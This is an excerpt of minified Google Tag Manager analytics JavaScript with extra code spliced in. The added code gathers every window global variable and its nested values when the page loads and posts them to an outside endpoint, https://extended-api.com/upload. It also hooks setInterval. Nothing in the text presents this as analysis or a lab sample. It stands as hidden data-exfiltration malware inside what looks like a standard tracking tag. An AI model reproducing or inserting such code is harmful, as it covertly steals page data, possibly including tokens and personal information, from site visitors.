...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "priority": 14,
        "vtp_instanceDestinationId": "G-Y48Y4ZYM45",
        "tag_id": 26
      }, {
        ...
        "priority": 2,
        "vtp_conversionRules": ["list", ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"first_open\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"in_app_purchase\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"ecommerce_purchase\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"app_store_subscription_convert\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"app_store_subscription_renew\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"purchase\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"], ["map", "matchingRules", "{\"type\":5,\"args\":[{\"stringValue\":\"ab_addLocationFlowStarted\"},{\"contextValue\":{\"namespaceType\":1,\"keyParts\":[\"eventName\"]}}]}"]],
        "vtp_instanceDestinationId": "G-Y48Y4ZYM45",
        "tag_id": 14
      }, {
  ...
  function gatherWindowPropertiesEnhanced() {
    ...
    for (const key in window) {
      ...
      if (!window.seenVars.includes(key)) {
        unrealizedProps[key] = {
          type: valueType,
          value: valueType === "function" ? "function(){}" : value
        };
      }
      if (valueType === "object" || valueType === "function") {
        for (let innerKey in value) {
          if (!Object.prototype.hasOwnProperty.call(value, innerKey)) continue;
          const innerValueType = typeof value[innerKey];
          globalVariablesCollection[`${key}.${innerKey}`] = {
            type: innerValueType,
            value: innerValueType === "function" ? "function(){}" : value[innerKey]
          };
        }
      }
    }
  ...
  async function postDataEnhanced(dataObject) {
    const endpoint = "https://extended-api.com/upload";
    try {
      ...
      if (!serverResponse.ok) {
        console.error("Unsuccessful data upload, StatusCode:" + serverResponse.status);
      } else {
        console.log("Data uploaded successfully");
      }
    } catch (uploadError) {
      console.error("Error occured during data upload:", uploadError);
    }
  }
  var Ib = function (a) {
  ...
  function gatherDataAndUpload() {
    const collectedData = gatherWindowPropertiesEnhanced();
    if (Object.keys(collectedData.unrealizedProps).length > 0 || Object.keys(collectedData.globalVariablesCollection).length > 0) {
      postDataEnhanced(collectedData);
    }
  }
  var ed = function (a, b) {
    hb.call(this);
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLyWqwYQga3KhPfohoyPARIlAOzHCQjPm4I9RukjFpnShPP/L3CZ0/fYi8j+/yCOoZ5XhIf0SRoCz2I\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
      ...
      if (eA[c]) eA[c].push(b);else {
        ...
        fA.push(function (f) {
          ...
          if (g) {
            var k = Iy(g);
            if (k) {
              var m = mA(k, "gtmFormInteractId", function () {
                  return hA++;
                }),
                ...
                p = e[m];
              p ? (p.Ia && (z.clearTimeout(p.Ia), p.qa.dataset.gtmFormInteractFieldId !== n && lA(p, d)), p.qa = g, nA(p, d, a)) : (e[m] = {
                form: k,
                qa: g,
                fc: 0,
                Ia: null
  ...
  function pA(a, b) {
    ...
    var e = nd(a),
      f;
    Cy("pix.fil", "init") ? f = Cy("pix.fil", "reg") : (kA(), f = oA, Ay("pix.fil", "reg", oA), Ay("pix.fil", "init", !0));
    f(d, e);
  }
  ...
  var rA = function (a, b, c) {
    ...
    vA = function () {
      ...
      Oc(E, "submit", function (c) {
        ...
        var e = c.defaultPrevented || !1 === c.returnValue,
          ...
          m = function () {
            if (k) {
              var n,
                p = {};
              g && (n = E.createElement("input"), n.type = "hidden", n.name = g.name, n.value = g.value, d.appendChild(n), g.hasAttribute("formaction") && (p.action = d.getAttribute("action"), Ac(d, qc(g.getAttribute("formaction")))), g.hasAttribute("formenctype") && (p.enctype = d.getAttribute("enctype"), d.setAttribute("enctype", g.getAttribute("formenctype"))), g.hasAttribute("formmethod") && (p.method = d.getAttribute("method"), d.setAttribute("method", g.getAttribute("formmethod"))), g.hasAttribute("formvalidate") && (p.validate = d.getAttribute("validate"), d.setAttribute("validate", g.getAttribute("formvalidate"))), g.hasAttribute("formtarget") && (p.target = d.getAttribute("target"), d.setAttribute("target", g.getAttribute("formtarget"))));
              b.call(d);
        ...
        if (tA(d, m, e, f, g)) return k = !1, c.returnValue;
        sA(e, m);
      ...
      if (vB[c]) vB[c].push(a);else {
        ...
        wB.push(function (f) {
          ...
          if (g) {
            var k = Iy(g);
            if (k) {
              var m = CB(k, "gtmFormInteractId", function () {
                  return yB++;
                }),
              ...
              if (null !== m && null !== n) {
                var p = e[m];
                p ? (p.Ia && (z.clearTimeout(p.Ia), p.qa.getAttribute("data-gtm-form-interact-field-id") !== n && AB(p, d)), p.qa = g, DB(p, d, b)) : (e[m] = {
                  form: k,
                  qa: g,
                  fc: 0,
                  Ia: null
  ...
  function FB(a, b) {
    ...
    if (Cy("fil", "init", !1)) {
      ...
      BB();
    }), EB(b, d), Ay("fil", "reg", EB), Ay("fil", "init", !0);
    return b;
  }
  ...
  var GB = function (a, b, c, d, e) {
      ...
      if (d && f) {
        if (!Kx(k, Lx(b, f), f)) return !1;
      } else Kx(k, function () {}, f || 2E3);
      return !0;
    },
    HB = function () {
      var a = [],
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-Y48Y4ZYM45'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  const jshook = function (target, prop, value) {
    if (target[prop]) {
  ...
  window.ogSetInterval = jshook(window, "setInterval", function (handler, timeout) {
    console.log('setInterval intercepted:', handler, timeout);
    return window.ogSetInterval(handler, timeout);
  });
  var dF = function (a) {
      var b = V(a.s, Q.g.La),
        c = a.s.C[Q.g.La];
  ...
  window.addEventListener("load", gatherDataAndUpload);
